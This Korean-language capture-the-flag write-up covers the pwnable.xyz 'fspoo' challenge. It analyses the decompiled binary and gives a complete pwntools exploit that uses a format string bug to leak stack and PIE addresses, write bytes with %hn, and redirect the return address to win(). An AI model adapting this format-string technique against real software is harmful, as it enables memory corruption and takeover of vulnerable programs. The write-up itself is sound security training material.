# [pwnable.xyz] fspoo

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Emojis on the rise
>
> Release: [fspoo.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8948824/fspoo.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174798792-9871d7b0-c27b-494a-8470-8a9fe9364e01.png)

## Analysis

### `setup()`

```c
char *setup()
{
  char *result; // eax

  setvbuf(&IO_2_1_stdout_, 0, 2, 0);
  setvbuf(&IO_2_1_stdin_, 0, 2, 0);
  signal(14, handler);
  alarm(0x3Cu);
  result = cmd;
  strcpy(&cmd[0x20], "Menu:\n");
  return result;
}
```

`cmd[0x20]`에는 초기에 `"Menu:\n"`라는 문자열이 들어가 있다.

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(&argc);
  printf("Name: ");
  read(0, &cmd[0x30], 0x1Fu);
  vuln();
  return 0;
}
```

`cmd[0x30]`부터 `0x1f`바이트만큼 name을 입력받고 `vuln()`을 실행한다.

### `vuln()`

```c
      printf(&cmd[0x20]);
```

초기에는 `cmd[0x20]`에 `setup()`에서 넣어둔 `"Menu:\n"`라는 문자열이 있지만, 다른 문자열로 덮어씌워질 수 있다. 서식 문자가 있다면 FSB가 발생할 수 있다.

#### 1. Edit name

```c
      if ( op != 1 )
        break;
      printf("Name: ");
      read(0, &cmd[0x30], 0x1Fu);
```

`cmd[0x30]`부터 `0x1f`바이트만큼 name을 입력받는다.

#### 2. Prep msg

```c
    if ( op == 2 )
    {
      sprintf(cmd, byte_B7B, &cmd[0x30]);
    }
```

![image](https://user-images.githubusercontent.com/104156058/174800807-b8680bff-8534-4d4b-b843-0f84297e18b1.png)

`sprintf()`로 name을 `cmd`에 복사한다. `0xbb7`에 있는 포맷 스트링에서 이모지와 공백의 길이를 합하면 7바이트이다.

#### 3. Print msg

```c
    else if ( op == 3 )
    {
      puts(cmd);
    }
```

`cmd`에 있는 문자열을 출력한다.

## Exploit

Name에는 최대 `0x1f`바이트를 입력할 수 있는데, name이 `cmd`로 복사될 때 7바이트 + `"%s"`로 구성된 포맷 스트링으로 복사되기 때문에, `cmd`에 최대 `0x26`바이트가 들어갈 수 있다. 그러면 `cmd[0x20]`부터 6바이트만큼을 원하는 문자열로 덮어쓸 수 있으므로, FSB를 발생시킬 수 있다.

### Stack leak

`vuln()`의 SFP에 있는 값(`main()`의 `ebp`)을 출력하면 스택의 주소를 계산할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/175230964-934e7522-efc8-461c-8941-039081827cda.png)

```python
# stack leak

sa('Name: ', 'a' * 0x19 + '%10$p')

prep_msg()

r.recvuntil('0x')
ebp = int(r.recvn(8), 16) - 0x10 # ebp of vuln()
log.info('ebp of vuln(): ' + hex(ebp))
```

### PIE leak

스택과 같은 방식으로 PIE base를 계산할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/175231021-3d1aa088-6890-4111-94e8-ff11b5211748.png)

```python
# PIE leak

edit_name('a' * 0x19 + '%9$p')

prep_msg()

r.recvuntil('0x')
pie = int(r.recvn(8), 16) - 0x1fa0 # PIE base
log.info('PIE base: ' + hex(pie))
```

### Extend format string

먼저 사용할 수 있는 포맷 스트링의 길이를 늘려야 한다.

![image](https://user-images.githubusercontent.com/104156058/175236178-7590fab5-79a8-42e6-8ce2-eb909ce14b5b.png)

표시된 부분에 있는 `0x00`들을 모두 다른 값으로 채우면, `cmd+48`부터 `0x1f`바이트만큼 원하는 포맷 스트링을 입력해서 사용할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/175234739-94aac8ef-a91f-4856-893d-b982e83e2d9e.png)

메뉴 번호를 선택하면 그 값은 `op`(`ebp-0x10`)에 들어간다. `op`의 값에 따라 분기하는 부분의 어셈블리 코드를 보면 다음과 같다.

![image](https://user-images.githubusercontent.com/104156058/175238828-eab1c2c0-da88-4b55-bb27-2c66db19d25e.png)

`ebp-0x10`에 있는 값을 가져와서 하위 1바이트만 사용한다. 즉, 상위 3바이트는 어떤 값이라도 상관이 없다.

Name에 `'a' * 0x19 + 'a%6$hn'`을 넣고 `2. Prep msg`를 실행하면 포맷 스트링은 `"a%6$hn"`이 되어, `op`의 값을 주소로 받아서 그 주소에 `0x0001`을 쓴다. 상위 3바이트를 쓰기 가능한 영역의 주소로 설정해서 에러가 발생하지 않도록 해야 한다.

`0`~`3` 이외의 번호를 선택하면 Invalid가 뜨고 다시 메뉴 선택으로 돌아가는데, 여기에 입력한 값은 스택에 그대로 남아있게 된다. 포맷 스트링에 `"a%6$hn"`인 상태에서 `op`에 `cmd`에 있는 `0x00`의 주소를 넣으면, 그 주소에 `0x01`이 들어가게 된다. 이 과정을 반복해서 `cmd+0x20`부터 `cmd+0x30`까지 `0x00`이 없게 만들 수 있다.

```python
# extend format string

edit_name('a' * 0x19 + 'a%6$hn')

sla('> ', str((cmd & 0xffffff00) + 2))

for offset in range(0x26, 0x30):
    sla('> ', str(cmd + offset))
```

![image](https://user-images.githubusercontent.com/104156058/175243440-ba496d27-82a2-4715-b28e-2f8f53978dd2.png)

### Call `win()`

`vuln()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다. 원래는 `main()`으로 돌아가기 때문에 상위 2바이트는 똑같고, 하위 2바이트만 덮으면 된다.

```python
# call win()

sla('> ', str((ret & 0xffffff00) + 1 - 0x100000000))
sa('Name: ', '%' + str((win & 0xffff) - 11) + 'c%6$hn\x00')

sla('> ', str(ret - 0x100000000))

sla('> ', '0') # return vuln()
```

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30010)

sla = r.sendlineafter
sa = r.sendafter

def edit_name(name):
    sla('> ', '1')
    sa('Name: ', name)

def prep_msg():
    sla('> ', '2')

def print_msg():
    sla('> ', '3')

cmd_offset = 0x2040  # offset of cmd from PIE base
win_offset = 0x9fd  # offset of win() from PIE base


# stack leak

sa('Name: ', 'a' * 0x19 + '%10$p')

prep_msg()

r.recvuntil('0x')
ebp = int(r.recvn(8), 16) - 0x10  # ebp of vuln()
log.info('ebp of vuln(): ' + hex(ebp))
ret = ebp + 4  # return address of vuln()


# PIE leak

edit_name('a' * 0x19 + '%9$p')

prep_msg()

r.recvuntil('0x')
pie = int(r.recvn(8), 16) - 0x1fa0  # PIE base
log.info('PIE base: ' + hex(pie))
cmd = pie + cmd_offset
win = pie + win_offset


# extend format string

edit_name('a' * 0x19 + 'a%6$hn')

sla('> ', str((cmd & 0xffffff00) + 2))

for offset in range(0x26, 0x30):
    sla('> ', str(cmd + offset))


# call win()

sla('> ', str((ret & 0xffffff00) + 1 - 0x100000000))
sa('Name: ', '%' + str((win & 0xffff) - 11) + 'c%6$hn\x00')

sla('> ', str(ret - 0x100000000))

sla('> ', '0')  # return vuln()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30010: Done
[*] ebp of vuln(): 0xffc78b08
[*] PIE base: 0x56618000
[*] Switching to interactive mode
FLAG{keen_eye_on_details}
```
